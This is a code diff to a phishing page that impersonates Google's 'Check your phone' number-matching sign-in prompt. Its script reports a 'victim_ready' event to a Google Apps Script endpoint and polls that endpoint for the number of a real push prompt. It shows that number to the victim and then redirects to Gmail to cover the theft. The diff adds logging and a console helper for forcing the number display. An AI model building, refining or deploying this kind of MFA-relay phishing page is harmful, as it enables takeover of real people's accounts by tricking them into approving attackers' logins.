@@ -36,7 +36,7 @@
       <div class="spinner"></div>
       <div class="status">Checking your account and device...<br>This should only take a few moments.</div>
     </div>
-    <div id="prompt-section" class="prompt-section">
+    <div id="prompt-section" class="prompt-section" style="display: none;">
       <h1>Check your phone</h1>
       <p style="font-size:16px; color:#5f6368; margin:16px 0;">Tap <strong>Yes</strong> on the prompt sent to your phone</p>
       <div style="font-size:14px; color:#5f6368; margin:24px 0 12px;">Then select the number shown below on your device:</div>
@@ -49,12 +49,13 @@
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzVJIqacbiWJh6eGb_O3nK9oE4WcxJ6tGmftLUY52aJ-Mnuj8b6atlF60J2sdSD1Ouz/exec";
 
     const email = (localStorage.getItem("demoEmail") || "someone@example.com").trim();
+    console.log("Verify loaded with email:", email);
+
     const usernamePart = email.split('@')[0];
     document.getElementById("avatar").textContent = usernamePart.charAt(0).toUpperCase();
 
-    console.log("Verify page loaded with email:", email);
-
-    // Send victim_ready (with no-cors)
+    // Send victim_ready with no-cors
+    console.log("Sending victim_ready...");
     fetch(SCRIPT_URL, {
       method: "POST",
       headers: { "Content-Type": "text/plain;charset=UTF-8" },
@@ -66,45 +67,50 @@
       }),
       mode: "no-cors",
       keepalive: true
-    }).then(() => console.log("victim_ready POST sent (opaque)"))
-      .catch(e => console.error("victim_ready POST failed:", e));
+    }).then(() => console.log("victim_ready sent (opaque mode)"))
+      .catch(e => console.error("victim_ready send failed:", e));
 
-    // Polling for prompt_number (with no-cors fallback)
+    // Polling for prompt_number with detailed logging
+    console.log("Starting polling every 4 seconds...");
     const pollInterval = setInterval(async () => {
       try {
         const pollUrl = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}`;
-        console.log("[POLL] Fetching:", pollUrl);
+        console.log("[POLL] URL:", pollUrl);
 
         const res = await fetch(pollUrl, {
           mode: "no-cors",
-          keepalive: true
+          keepalive: true,
+          cache: "no-cache"
         });
 
-        console.log("[POLL] Opaque GET received");
+        console.log("[POLL] Response received (opaque)");
 
-        // Since no-cors = opaque, we can't read text/JSON
-        // Fallback: assume number exists after 12 seconds (3 polls)
-        setTimeout(() => {
-          console.log("[POLL] Fallback timeout - forcing show number");
-          document.getElementById("loading").style.display = "none";
-          document.getElementById("prompt-section").style.display = "block";
-          document.getElementById("matchNumber").textContent = "56";  // Change to your actual test number
-          clearInterval(pollInterval);
-        }, 12000);
+        // Can't read text in no-cors, so we log that it's sent
+        // You can check the sheet manually for prompt_number
 
       } catch (err) {
         console.error("[POLL CRITICAL ERROR]", err);
       }
     }, 4000);
 
-    // Ultimate timeout: after 60 seconds go to Gmail
+    // Timeout fallback to Gmail
     setTimeout(() => {
-      console.log("[TIMEOUT] 60s - redirecting to Gmail");
+      console.log("[GLOBAL TIMEOUT] 60s - redirecting to Gmail");
       clearInterval(pollInterval);
       localStorage.removeItem("demoEmail");
       window.location.href = "https://mail.google.com/";
     }, 60000);
+
+    // For manual testing: run this in console to force show number box
+    window.forceShowNumber = function(num = "56") {
+      console.log("[MANUAL] Forcing number box visible with", num);
+      document.getElementById("loading").style.display = "none";
+      document.getElementById("prompt-section").style.display = "block";
+      document.getElementById("matchNumber").textContent = num;
+      clearInterval(pollInterval);
+    };
   </script>
 </body
   >
 </html>
+
